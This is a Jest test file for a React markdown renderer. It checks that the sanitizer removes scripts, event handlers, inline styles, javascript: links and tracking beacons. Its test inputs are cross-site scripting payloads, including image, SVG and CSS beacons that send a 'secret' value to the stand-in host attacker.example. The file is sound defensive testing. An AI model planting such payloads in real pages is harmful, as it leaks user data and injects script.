/**
 * @jest-environment jsdom
 */

import * as React from 'react';
import { render, screen } from '@testing-library/react';

jest.mock('marked', () => {
  const marked = Object.assign(jest.fn((content: string) => content), {
    setOptions: jest.fn()
  });
  return { marked };
});

import { MarkdownRenderer, sanitizeMarkdownHtml } from '@components/shared/MarkdownRenderer';

describe('MarkdownRenderer sanitization', () => {
  it('removes executable HTML, event handlers, inline styles, and image beacons', () => {
    render(
      <MarkdownRenderer content={[
        '<script>window.__pwned = true</script>',
        '<img src="https://attacker.example/beacon?secret=chapter" onerror="window.__pwned = true">',
        '<svg><image href="https://attacker.example/svg-beacon?secret=chapter"></image></svg>',
        '<p style="background:url(https://attacker.example/css-beacon)" onclick="window.__pwned = true">Safe prose</p>',
        '<a href="javascript:alert(1)">bad link</a>'
      ].join('')} />
    );

    expect(screen.getByText('Safe prose')).toBeTruthy();
    expect(document.querySelector('script')).toBeNull();
    expect(document.querySelector('img')).toBeNull();
    expect(document.querySelector('svg')).toBeNull();
    expect(document.querySelector('[onclick]')).toBeNull();
    expect(document.querySelector('[style]')).toBeNull();
    expect(document.querySelector('a')?.getAttribute('href')).toBeNull();
    expect(document.body.innerHTML).not.toContain('attacker.example');
  });

  it('sanitizes the parser-failure fallback instead of returning raw HTML', () => {
    expect(sanitizeMarkdownHtml('<script>alert(1)</script><strong>Kept</strong>'))
      .toBe('<strong>Kept</strong>');
  });
});
